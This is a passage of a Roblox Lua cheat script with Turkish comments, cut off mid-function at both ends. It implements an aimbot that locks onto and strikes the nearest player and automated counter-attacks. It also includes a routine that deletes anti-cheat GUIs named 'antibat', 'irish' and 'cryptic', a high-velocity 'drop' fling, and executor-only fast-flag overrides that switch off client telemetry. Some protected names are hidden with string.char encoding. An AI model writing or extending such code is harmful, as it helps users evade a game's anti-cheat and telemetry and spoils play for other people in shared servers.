-- (BAT_AIMBOT_SPEED) alir. Acikken PlayerGui'deki antibat GUI'lerini siler.
-- =====================================================================
bypassAimbotEnabled = false
setBypassAimbotVisual = nil

local _BYP = {
    conn = nil,
    patchToken = 0,
    lastSwing = 0,
    VERT_SPEED = 52,
    DISTANCE = -2.8,
    HEIGHT = 4.75,
    V_OFFSET = 1,
    MAX_TURN_RATE = 28,
    SWING_CD = 0.3,
    SWING_RANGE = 5,
}

function _BYP.quickPatch()
    pcall(function()
        local pg = LP:FindFirstChild("PlayerGui")
        if not pg then return end
        for _, child in ipairs(pg:GetChildren()) do
            local n = (child.Name or ""):lower()
            if n:find("antibat") or n:find("irish") or n:find("cryptic") then
                child:Destroy()
            end
        end
    end)
end

function _BYP.swing()
    local now = _tick()
    if now - _BYP.lastSwing < _BYP.SWING_CD then return end
    _BYP.lastSwing = now
    local bat = findBat()
    if bat and bat:IsA("Tool") then
        pcall(function() bat:Activate() end)
    end
end

function _BYP.step()
    if not bypassAimbotEnabled then return end
    if dropActive or _G.IsDropping then return end
    local char = LP.Character
    local hum = char and char:FindFirstChildOfClass("Humanoid")
    local root = char and char:FindFirstChild("HumanoidRootPart")
    if not hum or not root or hum.Health <= 0 then return end

    if not char:FindFirstChildOfClass("Tool") then
        local bat = findBat()
        if bat then pcall(function() hum:EquipTool(bat) end) end
    end

    local target = getClosestTarget()
    if not target then
        if not hum.AutoRotate then hum.AutoRotate = true end
        root.AssemblyAngularVelocity = _V3zero
        return
    end

    local aimPos = target.Position + _V3new(0, _BYP.V_OFFSET, 0)
    local look = aimPos - root.Position
    if look.Magnitude <= 0.01 then
        root.AssemblyAngularVelocity = _V3zero
        return
    end
    hum.AutoRotate = false

    local flat = _V3new(look.X, 0, look.Z)
    if flat.Magnitude > 0.01 then
        local targetYaw = math.deg(math.atan2(-flat.X, -flat.Z))
        local yawDelta = (targetYaw - root.Orientation.Y + 180) % 360 - 180
        local yawRate = _clamp(yawDelta * 8, -_BYP.MAX_TURN_RATE, _BYP.MAX_TURN_RATE)
        root.AssemblyAngularVelocity = _V3new(0, yawRate, 0)
    else
        root.AssemblyAngularVelocity = _V3zero
    end

    local standPos = aimPos - (look.Unit * _BYP.DISTANCE) + _V3new(0, _BYP.HEIGHT, 0)
    local moveDir = standPos - root.Position
    local hDir = _V3new(moveDir.X, 0, moveDir.Z)
    local hVel = hDir.Magnitude > 0.1 and hDir.Unit * BAT_AIMBOT_SPEED or _V3zero
    local vVel = _V3new(0, _clamp(moveDir.Y * 3, -_BYP.VERT_SPEED, _BYP.VERT_SPEED), 0)
    root.AssemblyLinearVelocity = hVel + vVel
    if hDir.Magnitude > 0.5 then hum:Move(hDir.Unit, false) end

    if (root.Position - target.Position).Magnitude < _BYP.SWING_RANGE then
        _BYP.swing()
    end
end

function disableBypassAimbot()
    local wasOn = bypassAimbotEnabled
    bypassAimbotEnabled = false
    _BYP.patchToken = _BYP.patchToken + 1
    if _BYP.conn then _BYP.conn:Disconnect(); _BYP.conn = nil end
    if wasOn then
        local char = LP.Character
        local root = char and char:FindFirstChild("HumanoidRootPart")
        local hum = char and char:FindFirstChildOfClass("Humanoid")
        if hum then
            hum.AutoRotate = true
            pcall(function() hum:Move(_V3zero, false) end)
        end
        if root then
            root.AssemblyLinearVelocity = _V3zero
            root.AssemblyAngularVelocity = _V3zero
        end
        _unsuppressBodyLock(true)
    end
    if setBypassAimbotVisual then setBypassAimbotVisual(false) end
end

function enableBypassAimbot()
    if bypassAimbotEnabled and _BYP.conn then return end
    disableAllAimbots()
    if autoLeftEnabled then
        autoLeftEnabled = false
        if autoLeftSetVisual then autoLeftSetVisual(false) end
        if mobSetAutoLeft then mobSetAutoLeft(false) end
        stopAutoLeft()
    end
    if autoRightEnabled then
        autoRightEnabled = false
        if autoRightSetVisual then autoRightSetVisual(false) end
        if mobSetAutoRight then mobSetAutoRight(false) end
        stopAutoRight()
    end

    bypassAimbotEnabled = true
    _suppressBodyLock()
    _BYP.quickPatch()
    _BYP.patchToken = _BYP.patchToken + 1
    local token = _BYP.patchToken
    task.spawn(function()
        while bypassAimbotEnabled and _BYP.patchToken == token do
            task.wait(5)
            if bypassAimbotEnabled and _BYP.patchToken == token then _BYP.quickPatch() end
        end
    end)
    _BYP.conn = RunService.Heartbeat:Connect(function() pcall(_BYP.step) end)
    if setBypassAimbotVisual then setBypassAimbotVisual(true) end
end

function toggleBypassAimbot()
    if bypassAimbotEnabled then disableBypassAimbot() else enableBypassAimbot() end
end

_G.BypassAimbotToggle = toggleBypassAimbot

function findBat()
    local char = LP.Character
    if not char then return nil end
    for _, name in ipairs(BAT_COUNTER_SLAP_LIST) do
        local t = char:FindFirstChild(name)
        if t and t:IsA("Tool") then return t end
    end
    local bp = LP:FindFirstChildOfClass("Backpack")
    if bp then
        for _, name in ipairs(BAT_COUNTER_SLAP_LIST) do
            local t = bp:FindFirstChild(name)
            if t and t:IsA("Tool") then
                local hum = char:FindFirstChildOfClass("Humanoid")
                if hum then pcall(function() hum:EquipTool(t) end) end
                return t
            end
        end
    end
    for _, ch in ipairs(char:GetChildren()) do
        if ch:IsA("Tool") and (ch.Name:lower():find("bat") or ch.Name:lower():find("slap")) then
            return ch
        end
    end
    return nil
end

function isBatTool(tool)
    if not tool then return false end
    for _, name in ipairs(BAT_COUNTER_SLAP_LIST) do
        if tool.Name == name then return true end
    end
    return tool.Name:lower():find("bat") or tool.Name:lower():find("slap")
end

function findBatForCounter()
    local char = LP.Character
    if not char then return nil end
    local backpack = LP:FindFirstChildOfClass("Backpack")
    for _, name in ipairs(BAT_COUNTER_SLAP_LIST) do
        local tool = char:FindFirstChild(name) or (backpack and backpack:FindFirstChild(name))
        if tool then return tool end
    end
    for _, child in ipairs(char:GetChildren()) do
        if child:IsA("Tool") and (child.Name:lower():find("bat") or child.Name:lower():find("slap")) then
            return child
        end
    end
    if backpack then
        for _, child in ipairs(backpack:GetChildren()) do
            if child:IsA("Tool") and (child.Name:lower():find("bat") or child.Name:lower():find("slap")) then
                return child
            end
        end
    end
    return nil
end

function swingBatForCounter(bat, character)
    local humanoid = character:FindFirstChildOfClass("Humanoid")
    if bat.Parent ~= character and humanoid then
        pcall(function() humanoid:EquipTool(bat) end)
        task.wait(0.05)
    end
    local remote = bat:FindFirstChildOfClass("RemoteEvent") or bat:FindFirstChildOfClass("RemoteFunction")
    if remote and remote:IsA("RemoteEvent") then
        pcall(function() remote:FireServer() end)
        task.wait(0.1)
        pcall(function() remote:FireServer() end)
    else
        pcall(function() bat:Activate() end)
        task.wait(0.1)
        pcall(function() bat:Activate() end)
    end
end

batCounterDebounce = false

function stopBatCounter()
    if Conns.batCounter then
        Conns.batCounter:Disconnect()
        Conns.batCounter = nil
    end
    batCounterDebounce = false
end

function startBatCounter()
    if Conns.batCounter then return end
    Conns.batCounter = RunService.Heartbeat:Connect(function()
        if not batCounterEnabled then return end
        if batCounterDebounce then return end
        local character = LP.Character
        if not character then return end
        local humanoid = character:FindFirstChildOfClass("Humanoid")
        if not humanoid then return end
        local state = humanoid:GetState()
        if state == Enum.HumanoidStateType.Physics or state == Enum.HumanoidStateType.Ragdoll or state == Enum.HumanoidStateType.FallingDown then
            batCounterDebounce = true
            _suppressBodyLock()
            task.spawn(function()
                task.wait(0.15)
                local bat = findBatForCounter()
                if bat then swingBatForCounter(bat, character) end
                task.wait(0.3)
                batCounterDebounce = false
                _unsuppressBodyLock(true)
            end)
        end
    end)
end

function findMedusa()
    local c = LP.Character
    if not c then return nil end
    for _, t in ipairs(c:GetChildren()) do
        if t:IsA("Tool") then
            local n = t.Name:lower()
            if n:find("medusa") or n:find("head") or n:find("stone") then return t end
        end
    end
    local bp = LP:FindFirstChild("Backpack")
    if bp then
        for _, t in ipairs(bp:GetChildren()) do
            if t:IsA("Tool") then
                local n = t.Name:lower()
                if n:find("medusa") or n:find("head") or n:find("stone") then return t end
            end
        end
    end
    return nil
end

function useMedusaCounter()
    if medusaDebounce then return end
    if _tick() - medusaLastUsed < MEDUSA_COOLDOWN then return end
    local c = LP.Character
    if not c then return end
    medusaDebounce = true
    local med = findMedusa()
    if not med then medusaDebounce = false; return end
    if med.Parent ~= c then
        local hum2 = c:FindFirstChildOfClass("Humanoid")
        if hum2 then hum2:EquipTool(med) end
    end
    pcall(function() med:Activate() end)
    medusaLastUsed = _tick()
    medusaDebounce = false
end

function onAnchorChanged(part)
    return part:GetPropertyChangedSignal("Anchored"):Connect(function()
        if medusaCounterEnabled and part.Anchored and part.Transparency == 1 then useMedusaCounter() end
    end)
end

function setupMedusaCounter(char)
    for _, c in pairs(Conns.anchor) do pcall(function() c:Disconnect() end) end
    Conns.anchor = {}
    if not char or not medusaCounterEnabled then return end
    for _, part in ipairs(char:GetDescendants()) do
        if part:IsA("BasePart") then
            table.insert(Conns.anchor, onAnchorChanged(part))
        end
    end
    table.insert(Conns.anchor, char.DescendantAdded:Connect(function(part)
        if part:IsA("BasePart") then
            table.insert(Conns.anchor, onAnchorChanged(part))
        end
    end))
end

function stopMedusaCounter()
    for _, c in pairs(Conns.anchor) do pcall(function() c:Disconnect() end) end
    Conns.anchor = {}
end

local DROP_ASCEND_DURATION = 0.2
local DROP_ASCEND_SPEED = 150
local _dropConn = nil

function stopDropBrainrot()
    dropActive = false
    if _dropConn then
        _dropConn:Disconnect()
        _dropConn = nil
    end
    for _, t in ipairs(dropConnections) do
        if type(t) == "thread" then pcall(task.cancel, t)
        elseif type(t) == "RBXScriptConnection" then pcall(t.Disconnect, t) end
    end
    dropConnections = {}
    local c = LP.Character
    if c then
        local root = c:FindFirstChild("HumanoidRootPart")
        if root then root.AssemblyLinearVelocity = _V3zero end
    end
    if dropBrainrotSetVisual then dropBrainrotSetVisual(false) end
    if mobSetDropBR then mobSetDropBR(false) end
end

function runDropBrainrot()
    if dropActive then return end
    local char = LP.Character
    local root = char and char:FindFirstChild("HumanoidRootPart")
    local hum = char and char:FindFirstChildOfClass("Humanoid")
    if not root or not hum then return end
    if dropMode == 1 then
        local speedH = 0
        if root then
            local vel = root.AssemblyLinearVelocity
            speedH = _V3new(vel.X, 0, vel.Z).Magnitude
        end
        local cooldown = (speedH > 5) and 0.6 or 0.25
        if _tick() - lastDropTime < cooldown then return end
        lastDropTime = _tick()
        dropActive = true
        if dropBrainrotSetVisual then dropBrainrotSetVisual(true) end
        if mobSetDropBR then mobSetDropBR(true) end
        local wasAutoBat = false
        if autoBatEnabled then
            wasAutoBat = true
            disableAutoBat()
            if autoBatSetVisual then autoBatSetVisual(false) end
            if mobSetAutoBat then mobSetAutoBat(false) end
        end
        local function finishDrop(threadRef)
            if threadRef and dropConnections then
                for i = #dropConnections, 1, -1 do
                    if dropConnections[i] == threadRef then
                        table.remove(dropConnections, i)
                        break
                    end
                end
            end
            dropActive = false
            local c = LP.Character
            if c then
                local r = c:FindFirstChild("HumanoidRootPart")
                local h = c:FindFirstChildOfClass("Humanoid")
                if r then
                    r.AssemblyLinearVelocity = _V3zero
                    r.AssemblyAngularVelocity = _V3zero
                    if r.Position.Y < -100 then
                        r.CFrame = _CFnew(r.Position.X, 5, r.Position.Z)
                    end
                    local rp = RaycastParams.new()
                    rp.FilterDescendantsInstances = {c}
                    rp.FilterType = Enum.RaycastFilterType.Exclude
                    local rr = workspace:Raycast(r.Position, _V3new(0, -2000, 0), rp)
                    if rr then
                        local off = (h and h.HipHeight or 2) + (r.Size.Y / 2)
                        r.CFrame = _CFnew(r.Position.X, rr.Position.Y + off, r.Position.Z)
                    end
                    if h and h.Health > 0 then h:ChangeState(Enum.HumanoidStateType.Running) end
                end
            end
            if wasAutoBat then
                enableAutoBat()
                if autoBatSetVisual then autoBatSetVisual(true) end
                if mobSetAutoBat then mobSetAutoBat(true) end
            end
            if dropBrainrotSetVisual then dropBrainrotSetVisual(false) end
            if mobSetDropBR then mobSetDropBR(false) end
        end
        local flingThread = nil
        flingThread = task.spawn(function()
            local startTime = _tick()
            while dropActive and (_tick() - startTime) < 0.25 do
                RunService.Heartbeat:Wait()
                local c = LP.Character
                local r = c and c:FindFirstChild("HumanoidRootPart")
                if not r then break end
                local vel = r.AssemblyLinearVelocity
                vel = _V3new(0, vel.Y, 0)
                r.AssemblyLinearVelocity = vel * 10000 + _V3new(0, 10000, 0)
                RunService.RenderStepped:Wait()
                if r and r.Parent then r.AssemblyLinearVelocity = vel end
                RunService.Stepped:Wait()
                if r and r.Parent then r.AssemblyLinearVelocity = vel + _V3new(0, 0.1, 0) end
            end
            finishDrop(flingThread)
        end)
        table.insert(dropConnections, flingThread)
        task.delay(0.35, function()
            if dropActive then finishDrop(flingThread) end
        end)
        return
    end

    if autoBatEnabled then
        autoBatEnabled = false
        if autoBatSetVisual then autoBatSetVisual(false) end
        if mobSetAutoBat then mobSetAutoBat(false) end
        if stopAimbotAdapt then stopAimbotAdapt() end
    end
    dropActive = true
    if dropBrainrotSetVisual then dropBrainrotSetVisual(true) end
    if mobSetDropBR then mobSetDropBR(false) end
    local t0 = _tick()
    if _dropConn then _dropConn:Disconnect() end
    _dropConn = RunService.Heartbeat:Connect(function()
        local r = char and char:FindFirstChild("HumanoidRootPart")
        if not r then
            if _dropConn then _dropConn:Disconnect(); _dropConn = nil end
            dropActive = false
            if dropBrainrotSetVisual then dropBrainrotSetVisual(false) end
            if mobSetDropBR then mobSetDropBR(false) end
            return
        end
        if _tick() - t0 >= DROP_ASCEND_DURATION then
            if _dropConn then _dropConn:Disconnect(); _dropConn = nil end
            local rp = _RayParams_new()
            rp.FilterDescendantsInstances = {char}
            rp.FilterType = Enum.RaycastFilterType.Exclude
            local rr = workspace:Raycast(r.Position, _V3new(0, -2000, 0), rp)
            if rr then
                local hum2 = char:FindFirstChildOfClass("Humanoid")
                local off = ((hum2 and hum2.HipHeight) or 2) + (r.Size.Y / 2)
                r.CFrame = _CFnew(r.Position.X, rr.Position.Y + off, r.Position.Z)
                r.AssemblyLinearVelocity = _V3zero
            end
            dropActive = false
            if dropBrainrotSetVisual then dropBrainrotSetVisual(false) end
            if mobSetDropBR then mobSetDropBR(false) end
            return
        end
        r.Velocity = _V3new(r.Velocity.X, DROP_ASCEND_SPEED, r.Velocity.Z)
    end)
end

function executeDropWithToggle(setVisual)
    if dropActive then return end
    task.spawn(function()
        if setVisual then setVisual(true) end
        runDropBrainrot()
        while dropActive do task.wait() end
        task.wait(0.1)
        if setVisual then setVisual(false) end
    end)
end

-- =====================================================================
-- ANTI LAG ULTRA
-- =====================================================================
local _alSaved = setmetatable({}, { __mode = "k" })
local _alDetached = {}
local _alAnimators = setmetatable({}, { __mode = "k" })
local _alStoppedTracks = setmetatable({}, { __mode = "k" })
local _alGeneration = 0
local _alScanCancel = nil
local _alConns = {}
local _alLightOrig = nil
local _alRunning = false

local AL_LOW_FLAGS = {
    {"DFIntClusterSenderMaxJoinBandwidthBps", "2100000000"},
    {"DFIntClusterSenderMaxUpdateBandwidthBps", "2100000000"},
    {"DFIntServerFramesBetweenJoins", "1"},
    {"DFIntRaknetBandwidthInfluxHundredthsPercentageV2", "10000"},
    {"DFIntConnectionMTUSize", "1400"},
    {"FIntRakNetResendBufferArrayLength", "1024"},
    {"DFIntRakNetNakResendDelayMsMax", "1"},
    {"DFIntWaitOnUpdateNetworkLoopEndedMS", "100"},
    {"DFIntWaitOnRecvFromLoopEndedMS", "100"},
    {"DFIntLargePacketQueueSizeCutoffMB", "1000"},
    {"DFIntSendRakNetStatsInterval", "2147483647"},
    {"DFIntRakNetLoopMs", "1"},
    {"DFIntRakNetSelectTimeoutMs", "1"},
    {"DFIntNetworkClusterPacketCacheNumParallelTasks", "8"},
    {"DFIntReplicationDataCacheNumParallelTasks", "8"},
    {"DFIntMegaReplicatorNumParallelTasks", "16"},
    {"DFIntMaxProcessPacketsStepsPerCyclic", "512"},
    {"DFIntMaxProcessPacketsStepsAccumulated", "0"},
    {"DFIntMaxProcessPacketsJobScaling", "1000"},
    {"DFIntClientPacketMaxFrameMicroseconds", "200000"},
    {"DFIntClientPacketExcessMicroseconds", "10000"},
    {"DFIntClientPacketMinMicroseconds", "1"},
    {"DFIntClientPacketMaxDelayMs", "1"},
    {"DFIntMaxWaitTimeBeforeForcePacketProcessMS", "1"},
    {"DFIntMaxFrameBufferSize", "4"},
    {"DFIntBufferCompressionThreshold", "100"},
    {"DFIntOverrideISRReplicatorStepBandwidthBytes", "131072"},
    {"DFIntTaskSchedulerJobInitThreads", "8"},
    {"DFIntTaskSchedulerJobInGameThreads", "8"},
    {"FIntTaskSchedulerAutoThreadLimit", "16"},
    {"FIntTaskSchedulerAsyncTasksMinimumThreadCount", "4"},
    {"DFIntRuntimeConcurrency", "16"},
    {"FIntSimWorldTaskQueueParallelTasks", "20"},
    {"DFIntHttpBatchLimit", "256"},
    {"FIntHttpBatchLimit", "256"},
    {"DFIntHttpCurlConnectionCacheSize", "512"},
    {"FIntDefaultMeshCacheSizeMB", "512"},
    {"DFIntMemCacheMaxCapacityMB", "256"},
    {"DFIntNumAssetsMaxToPreload", "1"},
    {"DFFlagEnableSoundPreloading", "false"},
    {"FFlagSlimContentProvider", "true"},
    {"DFFlagDebugSkipMeshVoxelizer", "true"},
    {"DFFlagTextureQualityOverrideEnabled", "true"},
    {"DFIntTextureQualityOverride", "0"},
    {"FIntDebugTextureManagerSkipMips", "7"},
    {"DFIntDebugLimitMinTextureResolutionWhenSkipMips", "8"},
    {"FFlagTM2SkipMipsForUnstreamable2", "true"},
    {"DFFlagDoNotSkipMipsBasedOnSystemMemoryPS", "true"},
    {"FFlagRenderUseTextureManager224", "false"},
    {"DFIntDebugFRMQualityLevelOverride", "1"},
    {"DFFlagDebugPauseVoxelizer", "true"},
    {"FFlagFastGPULightCulling3", "true"},
    {"FIntRenderLocalLightFadeInMs", "0"},
    {"FIntRenderLocalLightUpdatesMax", "1"},
    {"FIntRenderShadowmapBias", "0"},
    {"FIntSSAOMipLevels", "0"},
    {"FIntDebugForceMSAASamples", "1"},
    {"FIntDebugFRMOptionalMSAALevelOverride", "0"},
    {"FIntRobloxGuiBlurIntensity", "0"},
    {"FIntFRMMinGrassDistance", "0"},
    {"FIntFRMMaxGrassDistance", "0"},
    {"DFFlagCoreScriptTelemetry2", "false"},
    {"DFFlagBrowserTrackerIdTelemetryEnabled", "false"},
    {"FFlagPerfDataOnTelemetryV2", "false"},
    {"FFlagSendRenderFidelityTelemetry2", "false"},
    {"FFlagEnableTelemetryServiceMemoryCPUInfo", "false"},
    {"DFIntTelemetryProfilerHundredthsPercentage", "0"},
    {"FIntTelemetryProfilerFrequency", "0"},
    {"FIntPerformanceTelemetryQueueProcessLimit", "0"},
    {"DFIntContentProviderPreloadHangTelemetryHundredthsPercentage", "0"},
}

function _alApplyLowFlags()
    local env = (getgenv and getgenv()) or _G
    local setter = rawget(env, "setfflag") or rawget(_G, "set_fflag")
    local getter = rawget(env, "getfflag") or rawget(_G, "get_fflag")
    if type(setter) ~= "function" then return end
    for _, flag in ipairs(AL_LOW_FLAGS) do
        local canSet = true
        if type(getter) == "function" then
            local ok, current = pcall(getter, flag[1])
            canSet = ok and current ~= nil
        end
        if canSet then pcall(setter, flag[1], tostring(flag[2])) end
    end
end

function _alSaveLighting()
    if _alLightOrig then return end
    _alLightOrig = {
        Brightness = Lighting.Brightness,
        ClockTime = Lighting.ClockTime,
        OutdoorAmbient = Lighting.OutdoorAmbient,
        Ambient = Lighting.Ambient,
        GlobalShadows = Lighting.GlobalShadows,
        EnvironmentDiffuseScale = Lighting.EnvironmentDiffuseScale,
        EnvironmentSpecularScale = Lighting.EnvironmentSpecularScale,
        FogStart = Lighting.FogStart,
        FogEnd = Lighting.FogEnd,
    }
end

function _alApplyLowPermanentSettings()
    pcall(function() settings().Rendering.QualityLevel = Enum.QualityLevel.Level01 end)
    pcall(function()
        UserSettings():GetService("UserGameSettings").SavedQualityLevel = Enum.SavedQualitySetting.QualityLevel1
    end)
    pcall(function()
        Lighting.GlobalShadows = false
        Lighting.EnvironmentDiffuseScale = 0
        Lighting.EnvironmentSpecularScale = 0
        Lighting.FogStart = 0
        Lighting.FogEnd = 1e10
    end)
    pcall(function()
        local atmosphere = Lighting:FindFirstChildOfClass("Atmosphere")
        if atmosphere then
            atmosphere.Density = 0
            atmosphere.Glare = 0
            atmosphere.Haze = 0
        end
    end)
    pcall(function()
        local terrain = workspace:FindFirstChildOfClass("Terrain")
        if terrain then
            terrain.Decoration = false
            terrain.WaterWaveSize = 0
            terrain.WaterWaveSpeed = 0
            terrain.WaterReflectance = 0
            local clouds = terrain:FindFirstChildOfClass("Clouds")
            if clouds then clouds.Enabled = false end
        end
    end)
end

function _alChange(object, property, value)
    pcall(function()
        local original = object[property]
        if original == value then return end
        object[property] = value
        local bucket = _alSaved[object]
        if not bucket then bucket = {}; _alSaved[object] = bucket end
        if not bucket[property] then bucket[property] = { value = original } end
    end)
end

function _alIsProtectedVisual(object)
    local char = LP.Character
    if char and (object == char or object:IsDescendantOf(char)) then return true end
    local parent = object
    while parent and parent ~= workspace do
        if parent:IsA("LayerCollector") or parent:IsA("GuiObject") or parent:IsA("GuiBase2d") then
            return true
        end
        local name = parent.Name or ""
        if name:match("^Crystal") or name:match("^Eclipse") or name:match("^ESP_")
            or name:match("^Viper") or name:match("^" .. string.char(89, 111, 117, 116)) or name:match("^" .. string.char(66, 108, 111, 111, 100, 72, 111, 117, 110, 100, 115)) then
            return true
        end
        parent = parent.Parent
    end
    return false
end

function applyAntiLagDerender(obj)
    pcall(function()
        if not _alRunning then return end
        if _alIsProtectedVisual(obj) then return end

        if obj:IsA("Terrain") then
            _alChange(obj, "Decoration", false)
            _alChange(obj, "WaterWaveSize", 0)
            _alChange(obj, "WaterWaveSpeed", 0)
            _alChange(obj, "WaterReflectance", 0)
            _alChange(obj, "WaterTransparency", 1)
        end
        if obj:IsA("BasePart") then
            _alChange(obj, "Material", Enum.Material.Plastic)
            _alChange(obj, "MaterialVariant", "")
            _alChange(obj, "Reflectance", 0)
            _alChange(obj, "CastShadow", false)
            if obj:IsA("MeshPart") then
                _alChange(obj, "TextureID", "")
                _alChange(obj, "RenderFidelity", Enum.RenderFidelity.Performance)
                _alChange(obj, "DoubleSided", false)
            elseif obj:IsA("PartOperation") then
                _alChange(obj, "RenderFidelity", Enum.RenderFidelity.Performance)
            end
        elseif obj:IsA("SpecialMesh") then
            _alChange(obj, "TextureId", "")
        elseif obj:IsA("SurfaceAppearance") then
            _alDetached[obj] = true
            _alChange(obj, "Parent", nil)
        elseif obj:IsA("Decal") or obj:IsA("Texture") then
            _alChange(obj, "Transparency", 1)
            _alChange(obj, "Texture", "")
        elseif obj:IsA("ParticleEmitter") then
            _alChange(obj, "Enabled", false)
            _alChange(obj, "Rate", 0)
            pcall(function() obj:Clear() end)
        elseif obj:IsA("Trail") then
            _alChange(obj, "Enabled", false)
            pcall(function() obj:Clear() end)
        elseif obj:IsA("Beam") or obj:IsA("Fire") or obj:IsA("Smoke")
            or obj:IsA("Sparkles") or obj:IsA("Light") or obj:IsA("PostEffect")
            or obj:IsA("Clouds") then
            _alChange(obj, "Enabled", false)
        elseif obj:IsA("Atmosphere") then
            _alChange(obj, "Density", 0)
            _alChange(obj, "Haze", 0)
            _alChange(obj, "Glare", 0)
        elseif obj:IsA("Sky") then
            for _, face in ipairs({"SkyboxBk","SkyboxDn","SkyboxFt","SkyboxLf","SkyboxRt","SkyboxUp","SunTextureId","MoonTextureId"}) do
                _alChange(obj, face, "")
            end
            _alChange(obj, "StarCount", 0)
            _alChange(obj, "CelestialBodiesShown", false)
        elseif obj:IsA("Shirt") then
            _alChange(obj, "ShirtTemplate", "")
        elseif obj:IsA("Pants") then
            _alChange(obj, "PantsTemplate", "")
        elseif obj:IsA("ShirtGraphic") then
            _alChange(obj, "Graphic", "")
        elseif obj:IsA("Animator") then
            if not _alAnimators[obj] then
                local char = LP.Character
                if not (char and obj:IsDescendantOf(char)) then
                    _alAnimators[obj] = true
                    local token = _alGeneration
                    local ok, conn = pcall(function()
                        return obj.AnimationPlayed:Connect(function(track)
                            if not _alRunning or _alGeneration ~= token then return end
                            task.defer(function()
                                if _alRunning and _alGeneration == token then
                                    pcall(function() track:Stop(0) end)
                                end
                            end)
                        end)
                    end)
                    if ok then table.insert(_alConns, conn) end
                    pcall(function()
                        for _, track in ipairs(obj:GetPlayingAnimationTracks()) do
                            if track.IsPlaying then
                                _alStoppedTracks[track] = {
                                    animator = obj,
                                    time = track.TimePosition,
                                    speed = track.Speed,
                                }
                                track:Stop(0)
                            end
                        end
                    end)
                end
            end
        end
    end)
end

function enableAntiLag()
    if _alRunning then return end
    _alRunning = true
    antiLagEnabled = true
    _alGeneration = _alGeneration + 1
    local token = _alGeneration

    _alSaveLighting()
    _alApplyLowFlags()
    _alApplyLowPermanentSettings()

    for _, delaySeconds in ipairs({2, 6, 12, 20}) do
        task.delay(delaySeconds, function()
            if _alRunning and _alGeneration == token then
                _alApplyLowFlags()
            end
        end)
    end

    pcall(function() game:GetService("ReplicatedFirst"):RemoveDefaultLoadingScreen() end)

    table.insert(_alConns, workspace.DescendantAdded:Connect(function(obj)
        task.defer(function()
            if _alRunning and _alGeneration == token then
                pcall(applyAntiLagDerender, obj)
            end
        end)
    end))
    table.insert(_alConns, Lighting.DescendantAdded:Connect(function(obj)
        task.defer(function()
            if _alRunning and _alGeneration == token then
                pcall(applyAntiLagDerender, obj)
            end
        end)
    end))

    local function walkBatched(roots, apply, shouldContinue)
        task.spawn(function()
            local pending = {}
            for _, root in ipairs(roots) do
                if root then
                    local ok, children = pcall(function() return root:GetChildren() end)
                    if ok then for _, c in ipairs(children) do table.insert(pending, c) end end
                end
            end
            while #pending > 0 and _alRunning and _alGeneration == token and shouldContinue() do
                local deadline = os.clock() + 0.0008
                while #pending > 0 and os.clock() < deadline do
                    local obj = table.remove(pending)
                    pcall(apply, obj)
                    local ok, children = pcall(function() return obj:GetChildren() end)
                    if ok then for _, c in ipairs(children) do table.insert(pending, c) end end
                end
                RunService.Heartbeat:Wait()
            end
        end)
    end

    walkBatched({workspace, Lighting}, applyAntiLagDerender, function()
        return _alRunning and _alGeneration == token
    end)
end

function disableAntiLag()
    if not _alRunning then
        antiLagEnabled = false
        return
    end
    _alRunning = false
    antiLagEnabled = false
    _alGeneration = _alGeneration + 1

    if _alScanCancel then pcall(_alScanCancel); _alScanCancel = nil end

    for _, conn in ipairs(_alConns) do pcall(function() conn:Disconnect() end) end
    _alConns = {}

    for object, properties in pairs(_alSaved) do
        for property, original in pairs(properties) do
            pcall(function() object[property] = original.value end)
        end
    end
    _alSaved = setmetatable({}, { __mode = "k" })
    _alDetached = {}
    _alAnimators = setmetatable({}, { __mode = "k" })

    for track, state in pairs(_alStoppedTracks) do
        pcall(function()
            if state.animator.Parent and not track.IsPlaying then
                track:Play(0, 1, state.speed)
                track.TimePosition = state.time
            end
        end)
    end
    _alStoppedTracks = setmetatable({}, { __mode = "k" })

    if _alLightOrig then
        pcall(function()
            Lighting.Brightness = _alLightOrig.Brightness
            Lighting.ClockTime = _alLightOrig.ClockTime
            Lighting.OutdoorAmbient = _alLightOrig.OutdoorAmbient
            Lighting.Ambient = _alLightOrig.Ambient
            Lighting.GlobalShadows = _alLightOrig.GlobalShadows
            Lighting.EnvironmentDiffuseScale = _alLightOrig.EnvironmentDiffuseScale
            Lighting.EnvironmentSpecularScale = _alLightOrig.EnvironmentSpecularScale
            Lighting.FogStart = _alLightOrig.FogStart
            Lighting.FogEnd = _alLightOrig.FogEnd
        end)
    end
end

function applyStretchFOV(val)
    local cam = workspace.CurrentCamera
    if cam then pcall(function() cam.FieldOfView = val end) end
end

function enableStretch()
    if stretchConn then return end
    stretchEnabled = true
    local cam = workspace.CurrentCamera
    if not cam then return end
    origFOV = cam.FieldOfView or 70
    applyStretchFOV(stretchFOV)
    stretchConn = RunService.RenderStepped:Connect(function()
        if not stretchEnabled then
            stretchConn:Disconnect()
            stretchConn = nil
            return
        end
        local c = workspace.CurrentCamera
        if c then c.CFrame = c.CFrame * _CFnew(0,0,0,1,0,0,0,0.7,0,0,0,1) end
    end)
    if stretchFovConn then stretchFovConn:Disconnect() end
    stretchFovConn = RunService.RenderStepped:Connect(function()
        if stretchEnabled then applyStretchFOV(stretchFOV)
        else stretchFovConn:Disconnect(); stretchFovConn = nil end
    end)
end

function disableStretch()
    stretchEnabled = false
    if stretchConn then stretchConn:Disconnect(); stretchConn = nil end
    if stretchFovConn then stretchFovConn:Disconnect(); stretchFovConn = nil end
    local cam = workspace.CurrentCamera
    if cam then pcall(function() cam.FieldOfView = origFOV or 70 end) end
end

function saveLightingState()
    if _originalLighting then return end
    _originalLighting = {
        Brightness = Lighting.Brightness, ClockTime = Lighting.ClockTime,
        OutdoorAmbient = Lighting.OutdoorAmbient, GlobalShadows = Lighting.GlobalShadows,
        FogEnd = Lighting.FogEnd, FogStart = Lighting.FogStart,
        FogColor = Lighting.FogColor, Ambient = Lighting.Ambient,
        ColorCorrection = nil, Bloom = nil,
    }
    for _, e in ipairs(Lighting:GetChildren()) do
        if e:IsA("ColorCorrectionEffect") then
            _originalLighting.ColorCorrection = { Enabled = e.Enabled, Brightness = e.Brightness, Contrast = e.Contrast, Saturation = e.Saturation, TintColor = e.TintColor }
        elseif e:IsA("BloomEffect") then
            _originalLighting.Bloom = { Enabled = e.Enabled, Intensity = e.Intensity, Size = e.Size, Threshold = e.Threshold }
        end
    end
end

function restoreLightingState()
    if not _originalLighting then return end
    local old = _originalLighting
    Lighting.Brightness = old.Brightness
    Lighting.ClockTime = old.ClockTime
    Lighting.OutdoorAmbient = old.OutdoorAmbient
    Lighting.GlobalShadows = old.GlobalShadows
    Lighting.FogEnd = old.FogEnd
